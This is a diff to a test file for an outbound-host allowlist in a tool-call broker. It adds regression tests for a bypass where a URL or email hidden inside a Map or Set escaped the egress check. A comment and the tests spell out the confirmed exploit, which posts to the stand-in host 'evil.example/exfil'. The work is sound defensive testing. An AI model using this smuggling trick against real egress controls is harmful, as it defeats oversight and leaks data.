@@ -1,5 +1,12 @@
 import { describe, expect, it } from 'vitest';
-import { ArgsTooDeepError, findOutboundHosts, isAllowedOutboundHost } from '../src/index.js';
+import {
+  ArgsTooDeepError,
+  createBroker,
+  DisallowedOutboundHostError,
+  findOutboundDestinationsOutsideKeys,
+  findOutboundHosts,
+  isAllowedOutboundHost,
+} from '../src/index.js';
 
 describe('findOutboundHosts', () => {
   it('finds the hostname of a genuine http(s) URL in a plain string value', () => {
@@ -237,6 +244,203 @@ describe('findOutboundHosts destinationKeys scoping (additive, opt-in)', () => {
     let deep: unknown = 'bottom';
     for (let i = 0; i < 10_000; i++) deep = { nested: deep };
     expect(() => findOutboundHosts({ payload: deep }, { destinationKeys: ['payload'] })).toThrow(
+      ArgsTooDeepError,
+    );
+  });
+});
+
+// GAPS.md #18 / DESIGN.md §7.4: findOutboundHosts() used to be structurally
+// blind to a URL/email hidden inside a Map or Set anywhere in the args tree
+// — its visit() walk only handled Array.isArray(node), falling back to
+// Object.entries(node) for everything else, which returns [] for a Map or
+// Set (their entries live in an internal slot, not an own-enumerable
+// property). No error, no ArgsTooDeepError trip — just silently zero hosts
+// found, letting BrokerOptions.allowedOutboundHosts' documented "hard
+// structural boundary... traffic from this deployment never leaves to a host
+// I haven't approved, full stop" (DESIGN.md §7.4) be defeated outright by
+// nesting the destination one level inside either structure. Exactly the
+// same failure mode scanArgsForTaint() already had and already fixed (see
+// taint/scan.ts's own "not a theoretical gap" comment on its Map/Set
+// branches) — egress.ts simply never got the same fix until now. Confirmed
+// by direct exploitation (not just reasoned about) before the fix landed:
+// `broker.call('net_post', { headers: new Map([['url',
+// 'https://evil.example/exfil']]) })` executed successfully against an
+// allowlist of only `['approved.example']`.
+describe('Map/Set coverage — a destination nested inside a built-in whose state is not an own-enumerable property (GAPS.md #18)', () => {
+  it('finds a URL hidden as a Map VALUE', () => {
+    expect(
+      findOutboundHosts({ headers: new Map([['url', 'https://evil.example/exfil']]) }),
+    ).toEqual(['evil.example']);
+  });
+
+  it('finds a URL hidden as a Map KEY', () => {
+    // Unlike a plain object's property name (a fixed, schema-defined
+    // identifier — see findOutboundHosts' own doc comment for why THOSE are
+    // deliberately not scanned), a Map key is ordinary data, just as
+    // plausible a place to smuggle a destination as the value slot.
+    expect(
+      findOutboundHosts({ destinations: new Map([['https://evil.example/exfil', 'primary']]) }),
+    ).toEqual(['evil.example']);
+  });
+
+  it('finds a URL hidden inside a Set VALUE', () => {
+    expect(
+      findOutboundHosts({ recipients: new Set(['harmless', 'https://evil.example/exfil']) }),
+    ).toEqual(['evil.example']);
+  });
+
+  it('finds an email address hidden inside a Map value and a Set value, not just a URL', () => {
+    expect(findOutboundHosts({ headers: new Map([['to', 'someone@evil.example']]) })).toEqual([
+      'evil.example',
+    ]);
+    expect(findOutboundHosts({ recipients: new Set(['someone@evil.example']) })).toEqual([
+      'evil.example',
+    ]);
+  });
+
+  it('true negative: an allowlisted-looking host inside a Map/Set is found (extraction itself is allowlist-agnostic) but does not spuriously report an unrelated host', () => {
+    // findOutboundHosts() only ever extracts hosts; allowlist comparison is
+    // isAllowedOutboundHost()'s job (exercised end-to-end in
+    // broker.spec.ts's `allowedOutboundHosts` suite). Here: content that is
+    // genuinely benign (no URL/email shape at all) inside a Map/Set value
+    // must NOT be misreported as a host.
+    expect(
+      findOutboundHosts({
+        m: new Map([['note', 'nothing to see here']]),
+        s: new Set(['also nothing']),
+      }),
+    ).toEqual([]);
+  });
+
+  it('does not stack-overflow or double-scan a Map/Set participating in a cycle', () => {
+    const m = new Map<string, unknown>([['note', 'https://a.example']]);
+    m.set('self', m);
+    expect(findOutboundHosts({ m })).toEqual(['a.example']);
+  });
+
+  describe('interaction with destinationKeys scoping (GAPS.md #18, DESIGN.md §7.4)', () => {
+    it('a Map/Set nested under a declared destinationKeys path is still scanned', () => {
+      const args = {
+        url: new Map([['primary', 'https://evil.example/exfil']]),
+        text: 'https://internal-wiki.example/kb/42',
+      };
+      expect(findOutboundHosts(args, { destinationKeys: ['url'] })).toEqual(['evil.example']);
+    });
+
+    it('a Map/Set NOT under a declared destinationKeys path is exempt, matching existing plain-object destinationKeys semantics', () => {
+      const args = {
+        url: 'https://approved.example/post',
+        headers: new Map([['x-forward-to', 'https://evil.example/exfil']]),
+      };
+      expect(findOutboundHosts(args, { destinationKeys: ['url'] })).toEqual(['approved.example']);
+    });
+  });
+});
+
+describe('DisallowedOutboundHostError end-to-end via broker.call() — the exact confirmed exploit (GAPS.md #18)', () => {
+  it('a URL hidden inside a Map value is caught by an EXFIL-gated call and rejected for a non-allowlisted host', async () => {
+    const broker = createBroker({ allowedOutboundHosts: ['approved.example'] });
+    broker.register({
+      name: 'net_post',
+      capabilities: { capabilities: ['net:outbound'] },
+      async execute() {
+        return 'posted-ok';
+      },
+    });
+    await expect(
+      broker.call('net_post', { headers: new Map([['url', 'https://evil.example/exfil']]) }),
+    ).rejects.toBeInstanceOf(DisallowedOutboundHostError);
+  });
+
+  it('an allowlisted host hidden inside a Map value is NOT blocked (true negative)', async () => {
+    const broker = createBroker({ allowedOutboundHosts: ['approved.example'] });
+    broker.register({
+      name: 'net_post',
+      capabilities: { capabilities: ['net:outbound'] },
+      async execute() {
+        return 'posted-ok';
+      },
+    });
+    await expect(
+      broker.call('net_post', { headers: new Map([['url', 'https://approved.example/post']]) }),
+    ).resolves.toBe('posted-ok');
+  });
+});
+
+// The advisory-only counterpart to destinationKeys narrowing, built for
+// BrokerOptions.warnOnLikelyDestinationKeysMismatch (broker.ts, GAPS.md #18's
+// "destinationKeys assumes a fixed, singular destination key per tool"
+// sub-bullet) — end-to-end broker coverage lives in broker.spec.ts's own
+// `warnOnLikelyDestinationKeysMismatch` describe block; this is the direct
+// unit-level coverage for the tree walk itself, mirroring how
+// `findOutboundHosts` and its `destinationKeys` scoping are each tested
+// directly above.
+describe('findOutboundDestinationsOutsideKeys (advisory-only, GAPS.md #18)', () => {
+  it('finds a destination-shaped value outside the declared keys, naming its dotted path', () => {
+    const args = {
+      slackUrl: 'https://approved.example/hooks/1',
+      emailAddress: 'oncall@not-approved.example',
+    };
+    expect(findOutboundDestinationsOutsideKeys(args, ['slackUrl'])).toEqual([
+      { value: 'oncall@not-approved.example', path: 'emailAddress' },
+    ]);
+  });
+
+  it('finds nothing when every destination-shaped value is inside a declared key subtree', () => {
+    const args = { slackUrl: 'https://approved.example/hooks/1', channel: 'general' };
+    expect(findOutboundDestinationsOutsideKeys(args, ['slackUrl'])).toEqual([]);
+  });
+
+  it('does not flag a value inside the declared key subtree, even nested', () => {
+    const args = {
+      destinations: { primary: 'https://a.example', notes: 'ok' },
+      unrelated: 'not a url',
+    };
+    expect(findOutboundDestinationsOutsideKeys(args, ['destinations'])).toEqual([]);
+  });
+
+  it('an empty destinationKeys list means nothing is in scope — every destination-shaped value counts as outside', () => {
+    const args = { url: 'https://a.example' };
+    expect(findOutboundDestinationsOutsideKeys(args, [])).toEqual([
+      { value: 'https://a.example', path: 'url' },
+    ]);
+  });
+
+  it('tracks array paths using the same dotted/bracketed convention as TaintMatch.argPath / scanArgsForTaint', () => {
+    const args = { recipients: ['a@a.example', 'b@b.example'] };
+    expect(findOutboundDestinationsOutsideKeys(args, [])).toEqual([
+      { value: 'a@a.example', path: 'recipients[0]' },
+      { value: 'b@b.example', path: 'recipients[1]' },
+    ]);
+  });
+
+  it('finds a Map value outside a declared key, mirroring findOutboundHosts() own Map/Set coverage above', () => {
+    const args = {
+      url: 'https://approved.example/post',
+      headers: new Map([['x-forward-to', 'https://evil.example/exfil']]),
+    };
+    expect(findOutboundDestinationsOutsideKeys(args, ['url'])).toEqual([
+      { value: 'https://evil.example/exfil', path: 'headers<Map>[0].value' },
+    ]);
+  });
+
+  it('does not flag a Map/Set nested under a declared destinationKeys path', () => {
+    const args = { url: new Map([['primary', 'https://a.example']]) };
+    expect(findOutboundDestinationsOutsideKeys(args, ['url'])).toEqual([]);
+  });
+
+  it('tolerates a cyclic args object without infinite-looping', () => {
+    const args: Record<string, unknown> = { a: 'https://a.example' };
+    args.self = args;
+    expect(findOutboundDestinationsOutsideKeys(args, [])).toEqual([
+      { value: 'https://a.example', path: 'a' },
+    ]);
+  });
+
+  it('throws a clean, catchable ArgsTooDeepError on a pathologically deep args tree, same bound as findOutboundHosts', () => {
+    let deep: unknown = 'bottom';
+    for (let i = 0; i < 10_000; i++) deep = { nested: deep };
+    expect(() => findOutboundDestinationsOutsideKeys({ payload: deep }, ['other'])).toThrow(
       ArgsTooDeepError,
     );
   });
